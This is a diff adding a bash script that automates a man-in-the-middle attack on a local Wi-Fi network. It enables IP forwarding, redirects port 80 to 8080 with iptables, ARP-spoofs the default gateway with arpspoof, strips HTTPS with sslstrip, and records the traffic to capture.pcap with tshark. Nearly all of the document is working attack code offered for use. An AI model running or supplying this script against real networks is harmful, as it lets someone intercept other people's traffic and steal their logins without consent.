@@ -1,0 +1,44 @@
+#!/bin/bash
+
+#creating a capture file for tshar 
+touch capture.pcap
+
+#changing permission so that tshark can read the file
+sudo chmod o=r+w capture.pcap
+
+#getting ip info as string
+my_input=$(netstat -nr)
+
+#converting string to array 
+ip_list=($(echo $my_input | tr " " "\n"))
+
+#getting ip value-
+ip_addr=${ip_list[13]}
+
+#writing ip rules to run the script
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+#enabling ip forward
+echo "1" | sudo tee /proc/sys/net/ipv4/ip_forward
+
+#getting wifi interface
+wifi_interface=$(iw dev | awk '$1=="Interface"{print $2}')
+
+#using arpspoof and running the process in background throwing output to background
+#Not effective way
+#sudo arpspoof -i $wifi_interface $ip_addr > /dev/null 2>&1 &
+
+#cmd_1="arpspoof -i ${wifi_interface} ${ip_addr}; sleep 150"
+sudo xterm -e zsh -c "arpspoof -i ${wifi_interface} ${ip_addr}" &
+sudo xterm -e zsh -c "sslstrip -l 8080" &
+#using tshark to save the log
+#sudo tshark -i $wifi_interface -w capture.pcap > /dev/null 2>&1 &
+
+
+sudo xterm -e zsh -c "tshark -i ${wifi_interface} -w capture.pcap" &
+
+
+
+
+
+
